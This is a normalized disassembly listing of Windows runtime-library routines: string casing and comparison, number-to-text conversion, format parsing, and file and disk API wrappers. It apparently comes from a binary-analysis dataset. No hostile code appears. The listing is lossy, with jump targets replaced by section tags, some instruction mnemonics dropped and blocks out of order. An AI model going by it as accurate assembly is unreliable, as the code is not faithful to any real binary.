mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
pop edi
pop esi
pop ebx
retn
sub_407b44
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402cac
mov eax esi
pop esi
pop ebx
retn
sub_407b64
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
sub_407b90
push ebx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407b64
pop ebx
retn
sub_407bc8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042a0
mov ebx eax
mov eax edi
mov edx ebx
call sub_40462c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407c04
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042a0
mov ebx eax
mov eax edi
mov edx ebx
call sub_40462c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407c40
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407c70
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407c90
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407ce4
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407c90
test eax eax
jne r-xdata
sub_407d08
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042a0
mov ebx eax
mov eax esi
call sub_4044a0
mov edx eax
mov eax edi
mov ecx ebx
call sub_4040d0
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407d3c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042a0
mov ebx eax
mov eax esi
call sub_4044a0
mov edx eax
mov eax edi
mov ecx ebx
call sub_4040d0
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407d70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042a0
push eax
mov eax esi
call sub_4044a0
push eax
mov eax ebx
call sub_4042a0
push eax
mov eax ebx
call sub_4044a0
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407da8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042a0
push eax
mov eax esi
call sub_4044a0
push eax
mov eax ebx
call sub_4042a0
push eax
mov eax ebx
call sub_4044a0
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407df8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407e18
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4042a0
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403fe0
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404500
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407e68
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4042a0
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4042a0
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407ecc
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407ee2
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407ee2
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407ee2
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f18
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407ecc
mov edx esi
pop eax
call sub_4040d0
add esp 0x10
pop esi
retn
sub_407f38
or cl cl
jne sub_407f6c
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407f6c
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407f6c
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407f6c
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408004
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407f38
mov edx esi
pop eax
call sub_4040d0
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_40802c
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407ecc
mov edx esi
pop eax
call sub_4040d0
add esp 0x20
pop esi
retn
xor edx edx
sub_408054
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ccc
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407b20
sub_4080a8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ccc
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4080c8
mov eax [ rw-data ]
call sub_404dd8
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404dd8
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f94
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404034
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f94
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404034
sub_408158
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407de0
test al al
je r-xdata
sub_408194
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40939c
mov edx eax
test dl dl
je r-xdata
call sub_4080c8
push ebp
mov eax [ rw-data ]
call sub_404de0
mov edx eax
mov eax [ rw-data ]
call sub_408158
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404de0
mov edx eax
mov eax [ rw-data ]
call sub_408158
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408230
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404034
call sub_4080c8
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404034
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404034
jmp r-xdata
pop esi
pop ebx
retn
sub_40827c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4044a0
push eax
call CreateFileA
sub_4082d4
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4044a0
push eax
call CreateFileA
pop ebx
retn
sub_408300
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40832c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408358
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408398
push ebx
push esi
mov esi eax
mov eax esi
call sub_4042a0
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40be44
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4083c8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4042a0
mov edi eax
mov eax ebx
call sub_4044a0
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_4086cc
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40be44
cmp al 0x2
jne r-xdata
dec edi
sub_408418
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4083c8
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404500
pop edi
pop esi
pop ebx
retn
sub_408450
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_4083c8
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403fe0
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404500
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408498
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4044a0
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_4040d0
add esp 0x108
pop esi
pop ebx
retn
sub_4084d4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404db4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404db4
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408584
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4085ac
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4085e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4042a0
push eax
mov eax ebx
call sub_4044a0
mov edx eax
mov eax esi
pop ecx
call sub_4085ac
pop esi
pop ebx
retn
sub_408604
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4044a0
mov edx eax
mov ecx edi
mov eax ebx
call sub_4085ac
pop edi
pop esi
pop ebx
retn
sub_408624
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408648
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408688
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4086e0
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408754
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408548
mov esi eax
inc esi
mov eax esi
call sub_408734
mov ecx esi
mov edx ebx
call sub_408574
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408790
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40be68
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408574
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407b20
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408818
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408b6f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_4088fa
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408942
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_4088fa
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40880c
pop edx
or edx edx
je r-xdata
sub_4088fa
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408b6f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408942
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408b6f
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408790
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408969 ]
mov ebx ecx
sub cl 0x44
je sub_407f38
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404208
jmp r-xdata
mov esi sub_404268
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407f38
sub cl 0x44
je sub_407ecc
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407ecc
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407f38
mov ecx 0x10
cmp bl 0x58
je sub_407ecc
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4087e8
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408d28
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407ecc
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408b90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408548
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408818
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408bd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408548
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408818
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408c24
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4042a0
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042a0
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4042a0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408818
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_4040d0
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403fe0
mov eax esi
mov edx ebx
call sub_40462c
mov eax [ ebp - 0x4 ]
call sub_4042a0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408818
mov edx esi
xchg edx eax
call sub_40462c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408ce4
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
